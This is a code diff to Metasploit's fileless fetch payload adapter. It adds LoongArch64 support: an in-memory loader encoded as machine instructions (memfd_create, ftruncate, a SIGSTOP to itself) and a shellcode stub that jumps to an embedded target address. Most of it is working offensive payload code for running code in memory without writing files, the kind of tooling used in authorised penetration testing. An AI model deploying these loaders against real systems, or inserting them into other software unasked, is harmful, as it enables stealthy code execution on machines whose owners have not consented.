@@ -138,6 +138,27 @@ module Msf::Payload::Adapter::Fetch::Fileless
           0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
 ]
       payload = in_memory_loader_asm.pack('N*')
+    when 'loongarch64'
+      # LoongArch uses the asm-generic Linux syscall numbers, like AArch64.
+      # Create an empty memfd and stop this process while the parent fills it.
+      # Instruction encodings: LoongArch Reference Manual, Volume 1, section 2.2.
+      # https://loongson.github.io/LoongArch-Documentation/LoongArch-Vol1-EN.html
+      in_memory_loader_asm = [
+        0x03800005, # ori a1,zero,0 (flags and ftruncate length)
+        0x02ffc063, # addi.d sp,sp,-16
+        0x29c00060, # st.d zero,sp,0 (empty memfd name)
+        0x00150064, # or a0,sp,zero
+        0x03845c0b, # ori a7,zero,279 (SYS_memfd_create)
+        0x002b0000, # syscall 0
+        0x0380b80b, # ori a7,zero,46 (SYS_ftruncate)
+        0x002b0000, # syscall 0
+        0x0382b00b, # ori a7,zero,172 (SYS_getpid)
+        0x002b0000, # syscall 0
+        0x03804c05, # ori a1,zero,19 (SIGSTOP)
+        0x0382040b, # ori a7,zero,129 (SYS_kill)
+        0x002b0000  # syscall 0
+      ]
+      payload = in_memory_loader_asm.pack('V*')
     when 'riscv64le'
       # fd = memfd_create("")
       # ftruncate(fd, 0)
@@ -263,6 +284,12 @@ module Msf::Payload::Adapter::Fetch::Fileless
     when 'mips64'
       %^"041100000000000001ce7026dfee001001c0000800000000"$(echo $(printf %016x $vdso_addr))^
 
+    # LoongArch64 shellcode. Keep the embedded address eight-byte aligned.
+    # pcaddi t0,0; ld.d t0,t0,16; jirl zero,t0,0; nop
+    # .dword [target address]
+    when 'loongarch64'
+      %("0c0000188c41c0288001004c00004003"#{_hex_byte_swap_shell(16)})
+
     # RISC-V 64-bit LE shellcode
     # auipc t0, 0
     # ld    t0, 12(t0)
@@ -369,4 +396,3 @@ end
   end
 
 end
-
